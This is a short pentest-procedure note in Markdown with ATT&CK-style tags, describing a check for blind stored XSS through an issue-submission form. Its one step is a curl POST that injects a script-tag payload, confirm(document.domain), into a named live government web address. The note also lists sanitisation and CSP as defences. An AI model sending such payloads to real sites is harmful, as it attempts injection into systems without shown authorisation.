---
id: proc-uuid-6
tags:
  - stored-xss
  - blind-xss
type: procedure
tools:
  - '[[tools/Mozilla-Firefox]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-stored-xss-test]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:38.820Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Assess-Blind-Stored-XSS-Potential

## Summary

Submit a payload via the issue submission form to test for blind stored XSS, where the injection may persist and execute in administrative views.

## Description

While reflected XSS is direct, stored variants pose higher risk if admins view unsanitized inputs. Tested on /issue/request-id/574691; execution not verified without admin access.

## Requirements

1. Form submission access.
2. Monitoring for storage.

## Defense

Defensive measures and detection strategies:

- Sanitize stored inputs before admin display.
- Use admin-specific CSP.

## Objectives

1. Inject persistent payload.
2. Highlight admin risk.

## Instructions

### Step 1: Submit Stored Payload

**Context**: Use a script tag for potential JS storage.

**Command** ([[commands/curl-stored-xss-test]]):
```bash
curl -X POST 'https://www.data.gov/issue/request-id/574691' -d 'media_url=catalog.data.gov/dataset/consumer-complaint-database"%3E%3Cscript>confirm(document.domain)</script>'
```

> Submission succeeds; check admin interfaces hypothetically.

### Step 2: Assess Risk

**Context**: Note potential if reflected in admin panels.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-stored-xss-test]]

## Tools Used

- [[tools/Mozilla-Firefox]]

## Tags

- [[stored-xss]]
- [[blind-xss]]
